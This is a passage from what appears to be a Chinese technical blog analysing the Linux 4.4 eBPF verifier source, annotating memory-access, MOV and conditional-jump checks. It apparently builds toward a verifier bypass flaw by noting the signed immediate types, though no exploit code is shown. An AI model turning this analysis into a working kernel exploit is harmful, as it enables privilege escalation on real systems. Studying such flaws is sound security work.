<h4 id="check-mem-access"><a href="#check-mem-access" class="headerlink" title="check_mem_access"></a>check_mem_access</h4><p>regno是源寄存器，t是指令类型read/write，value_regno是目的寄存器，当指令对memory进行读写操作时，根据源寄存器类型分别进行不同的检查，中心思想是off不能超过memory的size范围，即不能溢出。当指令为写指令时，目的寄存器类型不能是常数或未知值；当指令为读指令时，目的寄存器类型置为UNKNOWN_VALUE。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//https://elixir.bootlin.com/linux/v4.4.110/source/kernel/bpf/verifier.c#L683</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">check_mem_access</span><span class="params">(struct verifier_env *env, u32 regno, <span class="keyword">int</span> off,</span></span></span><br><span class="line"><span class="function"><span class="params">			    <span class="keyword">int</span> bpf_size, <span class="keyword">enum</span> bpf_access_type t,</span></span></span><br><span class="line"><span class="function"><span class="params">			    <span class="keyword">int</span> value_regno)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">verifier_state</span> *<span class="title">state</span> = &amp;<span class="title">env</span>-&gt;<span class="title">cur_state</span>;</span></span><br><span class="line">	<span class="keyword">int</span> size, err = <span class="number">0</span>;</span><br><span class="line">    </span><br><span class="line">	<span class="comment">//源寄存器指向栈时，reg == frame_pointer + imm</span></span><br><span class="line">	<span class="keyword">if</span> (state-&gt;regs[regno].type == PTR_TO_STACK)</span><br><span class="line">		off += state-&gt;regs[regno].imm;</span><br><span class="line"></span><br><span class="line">	size = bpf_size_to_bytes(bpf_size);</span><br><span class="line">	<span class="keyword">if</span> (size &lt; <span class="number">0</span>)</span><br><span class="line">		<span class="keyword">return</span> size;</span><br><span class="line">    </span><br><span class="line">	<span class="comment">//判断访问的偏移off是否与buf的size对齐</span></span><br><span class="line">	<span class="keyword">if</span> (off % size != <span class="number">0</span>) &#123;</span><br><span class="line">		verbose(<span class="string">"misaligned access off %d size %d\n"</span>, off, size);</span><br><span class="line">		<span class="keyword">return</span> -EACCES;</span><br><span class="line">	&#125;</span><br><span class="line">    </span><br><span class="line">	<span class="comment">//源寄存器指向结构体buf_map，根据指令类型t分别处理</span></span><br><span class="line">	<span class="keyword">if</span> (state-&gt;regs[regno].type == PTR_TO_MAP_VALUE) &#123;</span><br><span class="line">		<span class="comment">//对bpf_map进行写操作，目的寄存器不能是常量或未知值</span></span><br><span class="line">		<span class="keyword">if</span> (t == BPF_WRITE &amp;&amp; value_regno &gt;= <span class="number">0</span> &amp;&amp;</span><br><span class="line">		    is_pointer_value(env, value_regno)) &#123;</span><br><span class="line">			verbose(<span class="string">"R%d leaks addr into map\n"</span>, value_regno);</span><br><span class="line">			<span class="keyword">return</span> -EACCES;</span><br><span class="line">		&#125;</span><br><span class="line">		err = check_map_access(env, regno, off, size); <span class="comment">//off不能超过buf_map的size范围</span></span><br><span class="line">		<span class="keyword">if</span> (!err &amp;&amp; t == BPF_READ &amp;&amp; value_regno &gt;= <span class="number">0</span>)</span><br><span class="line">			mark_reg_unknown_value(state-&gt;regs, value_regno); </span><br><span class="line">     </span><br><span class="line">	&#125; </span><br><span class="line">	</span><br><span class="line">	<span class="comment">//源寄存器指向bpf_context</span></span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span> (state-&gt;regs[regno].type == PTR_TO_CTX) &#123;</span><br><span class="line">		<span class="comment">//对bpf_context进行写操作，目的寄存器不能是常量或未知值</span></span><br><span class="line">		<span class="keyword">if</span> (t == BPF_WRITE &amp;&amp; value_regno &gt;= <span class="number">0</span> &amp;&amp;</span><br><span class="line">		    is_pointer_value(env, value_regno)) &#123;</span><br><span class="line">			verbose(<span class="string">"R%d leaks addr into ctx\n"</span>, value_regno);</span><br><span class="line">			<span class="keyword">return</span> -EACCES;</span><br><span class="line">		&#125;</span><br><span class="line">		err = check_ctx_access(env, off, size, t); </span><br><span class="line">		<span class="keyword">if</span> (!err &amp;&amp; t == BPF_READ &amp;&amp; value_regno &gt;= <span class="number">0</span>)</span><br><span class="line">			mark_reg_unknown_value(state-&gt;regs, value_regno); </span><br><span class="line"></span><br><span class="line">	&#125; </span><br><span class="line">	</span><br><span class="line">	<span class="comment">//源寄存器指向栈，检查地址偏移off的范围，指令类型为写指令时检查溢出，并检查读写操作时off是否超过size的范围</span></span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span> (state-&gt;regs[regno].type == FRAME_PTR ||</span><br><span class="line">		   state-&gt;regs[regno].type == PTR_TO_STACK) &#123;</span><br><span class="line">		<span class="keyword">if</span> (off &gt;= <span class="number">0</span> || off &lt; -MAX_BPF_STACK) &#123;</span><br><span class="line">			verbose(<span class="string">"invalid stack off=%d size=%d\n"</span>, off, size);</span><br><span class="line">			<span class="keyword">return</span> -EACCES;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> (t == BPF_WRITE) &#123;</span><br><span class="line">			<span class="keyword">if</span> (!env-&gt;allow_ptr_leaks &amp;&amp;</span><br><span class="line">			    state-&gt;stack_slot_type[MAX_BPF_STACK + off] == STACK_SPILL &amp;&amp;</span><br><span class="line">			    size != BPF_REG_SIZE) &#123;</span><br><span class="line">				verbose(<span class="string">"attempt to corrupt spilled pointer on stack\n"</span>);</span><br><span class="line">				<span class="keyword">return</span> -EACCES;</span><br><span class="line">			&#125;</span><br><span class="line">			err = check_stack_write(state, off, size, value_regno);</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			err = check_stack_read(state, off, size, value_regno);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		verbose(<span class="string">"R%d invalid mem access '%s'\n"</span>,</span><br><span class="line">			regno, reg_type_str[state-&gt;regs[regno].type]);</span><br><span class="line">		<span class="keyword">return</span> -EACCES;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> err;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>在for循环中对于每一类指令几乎都用到check_reg_arg函数，对内存读写指令会调用check_mem_access函数进行检查。</p>
<h3 id="BPF-ALU中的BPF-MOV"><a href="#BPF-ALU中的BPF-MOV" class="headerlink" title="BPF_ALU中的BPF_MOV"></a>BPF_ALU中的BPF_MOV</h3><p>for循环中首先检查类型为BPF_ALU中的指令，我们常用的MOV指令在此类指令中，类型为BPF_MOV，当指令为BPF_ALU时，调用check_alu_op函数进行检查，check_alu_op函数会根据指令的小类型比如BPF_MOV,BPF_ADD等类型分别进行处理，这里关注小类型为BPF_MOV的情况，函数会调用check_reg_arg对源操作数和目的操作数进行检查，如果源操作数是寄存器时，会直接将源寄存器的reg_state复制到目的寄存器中；如果源操作数是立即数，会将insn-&gt;imm复制到目的寄存器的imm中，insn-&gt;imm和reg_state的imm类型都是int类型，然后目的寄存器的类型设置为CONST_IMM.<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line">* check validity of <span class="number">32</span>-bit <span class="keyword">and</span> <span class="number">64</span>-bit arithmetic operations */</span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">check_alu_op</span><span class="params">(struct verifier_env *env, struct bpf_insn *insn)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">reg_state</span> *<span class="title">regs</span> = <span class="title">env</span>-&gt;<span class="title">cur_state</span>.<span class="title">regs</span>;</span></span><br><span class="line">	u8 opcode = BPF_OP(insn-&gt;code);</span><br><span class="line">	<span class="keyword">int</span> err;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (opcode == BPF_END || opcode == BPF_NEG) &#123;</span><br><span class="line">		... ...</span><br><span class="line"></span><br><span class="line">	&#125; <span class="keyword">else</span> <span class="keyword">if</span> (opcode == BPF_MOV) &#123;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (BPF_SRC(insn-&gt;code) == BPF_X) &#123;</span><br><span class="line">			<span class="keyword">if</span> (insn-&gt;imm != <span class="number">0</span> || insn-&gt;off != <span class="number">0</span>) &#123;</span><br><span class="line">				verbose(<span class="string">"BPF_MOV uses reserved fields\n"</span>);</span><br><span class="line">				<span class="keyword">return</span> -EINVAL;</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			<span class="comment">/* check src operand */</span></span><br><span class="line">			err = check_reg_arg(regs, insn-&gt;src_reg, SRC_OP);</span><br><span class="line">			<span class="keyword">if</span> (err)</span><br><span class="line">				<span class="keyword">return</span> err;</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="keyword">if</span> (insn-&gt;src_reg != BPF_REG_0 || insn-&gt;off != <span class="number">0</span>) &#123;</span><br><span class="line">				verbose(<span class="string">"BPF_MOV uses reserved fields\n"</span>);</span><br><span class="line">				<span class="keyword">return</span> -EINVAL;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="comment">/* check dest operand */</span></span><br><span class="line">		err = check_reg_arg(regs, insn-&gt;dst_reg, DST_OP);</span><br><span class="line">		<span class="keyword">if</span> (err)</span><br><span class="line">			<span class="keyword">return</span> err;</span><br><span class="line">        </span><br><span class="line">		<span class="comment">//源操作数是寄存器时，将源寄存器的reg_state复制到目的寄存器中</span></span><br><span class="line">		<span class="keyword">if</span> (BPF_SRC(insn-&gt;code) == BPF_X) &#123;</span><br><span class="line">			<span class="keyword">if</span> (BPF_CLASS(insn-&gt;code) == BPF_ALU64) &#123;</span><br><span class="line">				<span class="comment">/* case: R1 = R2</span></span><br><span class="line"><span class="comment">				 * copy register state to dest reg</span></span><br><span class="line"><span class="comment">				 */</span></span><br><span class="line">				regs[insn-&gt;dst_reg] = regs[insn-&gt;src_reg];</span><br><span class="line">			&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">				<span class="keyword">if</span> (is_pointer_value(env, insn-&gt;src_reg)) &#123;</span><br><span class="line">					verbose(<span class="string">"R%d partial copy of pointer\n"</span>,</span><br><span class="line">						insn-&gt;src_reg);</span><br><span class="line">					<span class="keyword">return</span> -EACCES;</span><br><span class="line">				&#125;</span><br><span class="line">				regs[insn-&gt;dst_reg].type = UNKNOWN_VALUE;</span><br><span class="line">				regs[insn-&gt;dst_reg].map_ptr = <span class="literal">NULL</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123; <span class="comment">//源操作数是立即数，将源操作数的数值复制到目的寄存器中，且目的寄存器类型设置为CONST_IMM</span></span><br><span class="line">			<span class="comment">/* case: R = imm</span></span><br><span class="line"><span class="comment">			 * remember the value we stored into this reg</span></span><br><span class="line"><span class="comment">			 */</span></span><br><span class="line">			regs[insn-&gt;dst_reg].type = CONST_IMM;</span><br><span class="line">			regs[insn-&gt;dst_reg].imm = insn-&gt;imm; <span class="comment">//int类型</span></span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">	&#125; <span class="keyword">else</span> <span class="keyword">if</span> (opcode &gt; BPF_END) &#123;</span><br><span class="line">		verbose(<span class="string">"invalid BPF_ALU opcode %x\n"</span>, opcode);</span><br><span class="line">		<span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;	<span class="comment">/* all other ALU ops: and, sub, xor, add, ... */</span></span><br><span class="line"></span><br><span class="line">		... ...</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h3 id="BPF-JMP"><a href="#BPF-JMP" class="headerlink" title="BPF_JMP"></a>BPF_JMP</h3><p>如果指令为BPF_JMP类型，do_check函数将跳转指令分为四类情况，第一类是函数调用BPF_CALL指令，第二类是BPF_JA指令，第三类是退出指令BPF_EXIT，第四类是其他跳转指令。第四类跳转指令将进入函数check_cond_jmp_op进行检查。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//https://elixir.bootlin.com/linux/v4.4.110/source/kernel/bpf/verifier.c#L1893</span></span><br><span class="line">		&#125; <span class="keyword">else</span> <span class="keyword">if</span> (class == BPF_JMP) &#123;</span><br><span class="line">			u8 opcode = BPF_OP(insn-&gt;code);</span><br><span class="line"></span><br><span class="line">			<span class="keyword">if</span> (opcode == BPF_CALL) &#123;</span><br><span class="line">				<span class="keyword">if</span> (BPF_SRC(insn-&gt;code) != BPF_K ||</span><br><span class="line">				    insn-&gt;off != <span class="number">0</span> ||</span><br><span class="line">				    insn-&gt;src_reg != BPF_REG_0 ||</span><br><span class="line">				    insn-&gt;dst_reg != BPF_REG_0) &#123;</span><br><span class="line">					verbose(<span class="string">"BPF_CALL uses reserved fields\n"</span>);</span><br><span class="line">					<span class="keyword">return</span> -EINVAL;</span><br><span class="line">				&#125;</span><br><span class="line"></span><br><span class="line">				err = check_call(env, insn-&gt;imm);</span><br><span class="line">				<span class="keyword">if</span> (err)</span><br><span class="line">					<span class="keyword">return</span> err;</span><br><span class="line"></span><br><span class="line">			&#125; <span class="keyword">else</span> <span class="keyword">if</span> (opcode == BPF_JA) &#123;</span><br><span class="line">				<span class="keyword">if</span> (BPF_SRC(insn-&gt;code) != BPF_K ||</span><br><span class="line">				    insn-&gt;imm != <span class="number">0</span> ||</span><br><span class="line">				    insn-&gt;src_reg != BPF_REG_0 ||</span><br><span class="line">				    insn-&gt;dst_reg != BPF_REG_0) &#123;</span><br><span class="line">					verbose(<span class="string">"BPF_JA uses reserved fields\n"</span>);</span><br><span class="line">					<span class="keyword">return</span> -EINVAL;</span><br><span class="line">				&#125;</span><br><span class="line"></span><br><span class="line">				insn_idx += insn-&gt;off + <span class="number">1</span>;</span><br><span class="line">				<span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">			&#125; <span class="keyword">else</span> <span class="keyword">if</span> (opcode == BPF_EXIT) &#123;</span><br><span class="line">				<span class="keyword">if</span> (BPF_SRC(insn-&gt;code) != BPF_K ||</span><br><span class="line">				    insn-&gt;imm != <span class="number">0</span> ||</span><br><span class="line">				    insn-&gt;src_reg != BPF_REG_0 ||</span><br><span class="line">				    insn-&gt;dst_reg != BPF_REG_0) &#123;</span><br><span class="line">					verbose(<span class="string">"BPF_EXIT uses reserved fields\n"</span>);</span><br><span class="line">					<span class="keyword">return</span> -EINVAL;</span><br><span class="line">				&#125;</span><br><span class="line"></span><br><span class="line">				<span class="comment">/* eBPF calling convetion is such that R0 is used</span></span><br><span class="line"><span class="comment">				 * to return the value from eBPF program.</span></span><br><span class="line"><span class="comment">				 * Make sure that it's readable at this time</span></span><br><span class="line"><span class="comment">				 * of bpf_exit, which means that program wrote</span></span><br><span class="line"><span class="comment">				 * something into it earlier</span></span><br><span class="line"><span class="comment">				 */</span></span><br><span class="line">				err = check_reg_arg(regs, BPF_REG_0, SRC_OP);</span><br><span class="line">				<span class="keyword">if</span> (err)</span><br><span class="line">					<span class="keyword">return</span> err;</span><br><span class="line"></span><br><span class="line">				<span class="keyword">if</span> (is_pointer_value(env, BPF_REG_0)) &#123;</span><br><span class="line">					verbose(<span class="string">"R0 leaks addr as return value\n"</span>);</span><br><span class="line">					<span class="keyword">return</span> -EACCES;</span><br><span class="line">				&#125;</span><br><span class="line"></span><br><span class="line">process_bpf_exit:</span><br><span class="line">				insn_idx = pop_stack(env, &amp;prev_insn_idx);</span><br><span class="line">				<span class="keyword">if</span> (insn_idx &lt; <span class="number">0</span>) &#123;</span><br><span class="line">					<span class="keyword">break</span>;</span><br><span class="line">				&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">					do_print_state = <span class="literal">true</span>;</span><br><span class="line">					<span class="keyword">continue</span>;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">				err = check_cond_jmp_op(env, insn, &amp;insn_idx);</span><br><span class="line">				<span class="keyword">if</span> (err)</span><br><span class="line">					<span class="keyword">return</span> err;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br></pre></td></tr></table></figure></p>
<p>第四类跳转执行check_cond_jmp_op中的检查逻辑。这个函数主要关注条件跳转中目的寄存器是立即数的情况。当跳转指令类型是BPF_JEQ或BPF_JNE跳转时，会检查目的寄存器是否为立即数，如果是立即数，会检查当前指令的imm与目的寄存器的imm是否相等，如果两个imm相等恒成立，就是确定性跳转，就直接跳转到pc+off继续执行。如果不是确定性跳转，则说明跳转的两个分支都有可能执行，这里将不符合跳转条件的分支记作分支A，符合跳转条件的分支记作分支B，函数会继续检查分支A，直至遇到BPF_EXIT指令，并将分支B（insn_idx + insn-&gt;off + 1）压入一个临时栈中。这里注意到两个imm的类型，目的寄存器类型是reg_state，成员imm的类型是int有符号整数，指令类型是_s32，是有符号整数，两个均为有符号整数。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//https://elixir.bootlin.com/linux/v4.4.110/source/kernel/bpf/verifier.c#L1192</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">check_cond_jmp_op</span><span class="params">(struct verifier_env *env,</span></span></span><br><span class="line"><span class="function"><span class="params">			     struct bpf_insn *insn, <span class="keyword">int</span> *insn_idx)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">reg_state</span> *<span class="title">regs</span> = <span class="title">env</span>-&gt;<span class="title">cur_state</span>.<span class="title">regs</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">verifier_state</span> *<span class="title">other_branch</span>;</span></span><br><span class="line">	u8 opcode = BPF_OP(insn-&gt;code);</span><br><span class="line">	<span class="keyword">int</span> err;</span><br><span class="line">  </span><br><span class="line">	<span class="keyword">if</span> (opcode &gt; BPF_EXIT) &#123;</span><br><span class="line">		verbose(<span class="string">"invalid BPF_JMP opcode %x\n"</span>, opcode);</span><br><span class="line">		<span class="keyword">return</span> -EINVAL;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (BPF_SRC(insn-&gt;code) == BPF_X) &#123;</span><br><span class="line">		<span class="keyword">if</span> (insn-&gt;imm != <span class="number">0</span>) &#123;</span><br><span class="line">			verbose(<span class="string">"BPF_JMP uses reserved fields\n"</span>);</span><br><span class="line">			<span class="keyword">return</span> -EINVAL;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="comment">/* check src1 operand */</span></span><br><span class="line">		err = check_reg_arg(regs, insn-&gt;src_reg, SRC_OP);</span><br><span class="line">		<span class="keyword">if</span> (err)</span><br><span class="line">			<span class="keyword">return</span> err;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (is_pointer_value(env, insn-&gt;src_reg)) &#123;</span><br><span class="line">			verbose(<span class="string">"R%d pointer comparison prohibited\n"</span>,</span><br><span class="line">				insn-&gt;src_reg);</span><br><span class="line">			<span class="keyword">return</span> -EACCES;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="keyword">if</span> (insn-&gt;src_reg != BPF_REG_0) &#123;</span><br><span class="line">			verbose(<span class="string">"BPF_JMP uses reserved fields\n"</span>);</span><br><span class="line">			<span class="keyword">return</span> -EINVAL;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* check src2 operand */</span></span><br><span class="line">	err = check_reg_arg(regs, insn-&gt;dst_reg, SRC_OP);</span><br><span class="line">	<span class="keyword">if</span> (err)</span><br><span class="line">		<span class="keyword">return</span> err;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* detect if R == 0 where R was initialized to zero earlier */</span></span><br><span class="line">	<span class="comment">//跳转是BPF_JEQ或BPF_JNE跳转，且目的寄存器为立即数</span></span><br><span class="line">	<span class="keyword">if</span> (BPF_SRC(insn-&gt;code) == BPF_K &amp;&amp;</span><br><span class="line">	    (opcode == BPF_JEQ || opcode == BPF_JNE) &amp;&amp;</span><br><span class="line">	    regs[insn-&gt;dst_reg].type == CONST_IMM &amp;&amp;</span><br><span class="line">	    regs[insn-&gt;dst_reg].imm == insn-&gt;imm) &#123;</span><br><span class="line">		<span class="comment">//如果指令中的imm与目的寄存器的imm相同，则直接进行跳转</span></span><br><span class="line">		<span class="keyword">if</span> (opcode == BPF_JEQ) &#123;</span><br><span class="line">			<span class="comment">/* if (imm == imm) goto pc+off;</span></span><br><span class="line"><span class="comment">			 * only follow the goto, ignore fall-through</span></span><br><span class="line"><span class="comment">			 */</span></span><br><span class="line">			*insn_idx += insn-&gt;off;</span><br><span class="line">			<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123; <span class="comment">//如果指令中的imm与目的寄存器的imm不相等，则直接返回</span></span><br><span class="line">			<span class="comment">/* if (imm != imm) goto pc+off;</span></span><br><span class="line"><span class="comment">			 * only follow fall-through branch, since</span></span><br><span class="line"><span class="comment">			 * that's where the program will go</span></span><br><span class="line"><span class="comment">			 */</span></span><br><span class="line">			<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//将符合跳转条件的跳转分支insn-&gt;off + 1压入临时栈，作为另外一条分支</span></span><br><span class="line">	other_branch = push_stack(env, *insn_idx + insn-&gt;off + <span class="number">1</span>, *insn_idx);</span><br><span class="line">	<span class="keyword">if</span> (!other_branch)</span><br><span class="line">		<span class="keyword">return</span> -EFAULT;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* detect if R == 0 where R is returned value from bpf_map_lookup_elem() */</span></span><br><span class="line">	<span class="keyword">if</span> (BPF_SRC(insn-&gt;code) == BPF_K &amp;&amp;</span><br><span class="line">	    insn-&gt;imm == <span class="number">0</span> &amp;&amp; (opcode == BPF_JEQ ||</span><br><span class="line">			       opcode == BPF_JNE) &amp;&amp;</span><br><span class="line">	    regs[insn-&gt;dst_reg].type == PTR_TO_MAP_VALUE_OR_NULL) &#123;</span><br><span class="line">		<span class="keyword">if</span> (opcode == BPF_JEQ) &#123;</span><br><span class="line">			<span class="comment">/* next fallthrough insn can access memory via</span></span><br><span class="line"><span class="comment">			 * this register</span></span><br><span class="line"><span class="comment">			 */</span></span><br><span class="line">			regs[insn-&gt;dst_reg].type = PTR_TO_MAP_VALUE;</span><br><span class="line">			<span class="comment">/* branch targer cannot access it, since reg == 0 